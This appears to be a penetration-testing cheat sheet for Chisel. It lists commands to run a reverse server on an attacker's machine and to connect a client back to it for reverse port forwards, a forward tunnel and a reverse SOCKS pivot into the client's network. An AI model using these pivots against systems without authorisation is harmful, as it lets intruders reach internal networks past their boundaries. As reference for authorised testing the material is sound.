# Chisel
> Fast TCP/UDP tunnel over HTTP, secured via SSH — reverse port forwards and SOCKS pivots.

<!-- tags: pivoting, tunnel, chisel, socks, port-forward, network, post -->

---

## reverse server chisel
Start a reverse-capable Chisel server on your attacker box for clients to call back to.

```bash
./chisel server -v -p {{LPORT:port:8000}} --reverse
```

<!-- meta: risk=safe | phase=post | tags=chisel,server,reverse -->

---

## reverse port forward chisel
Expose a port from the client side back onto the server (attacker) side.

```bash
./chisel client -v {{LHOST:ip}}:{{LPORT:port:8000}} R:{{RPORT:port:8001}}:localhost:{{LPORT:port:80}}
```

<!-- meta: risk=med | phase=post | tags=chisel,reverse,port-forward -->

---

## forward port chisel
Expose a server-side listener to the client side (forward tunnel).

```bash
./chisel client -v {{LHOST:ip}}:{{LPORT:port:8000}} 0.0.0.0:{{LPORT:port:8080}}:127.0.0.1:{{RPORT:port:80}}
```

<!-- meta: risk=med | phase=post | tags=chisel,forward,port-forward -->

---

## reverse socks proxy chisel
Create a reverse SOCKS proxy on the Chisel server to pivot into the client's network.

```bash
./chisel client {{LHOST:ip}}:{{LPORT:port:8000}} R:socks
```

<!-- meta: risk=med | phase=post | tags=chisel,socks,reverse -->
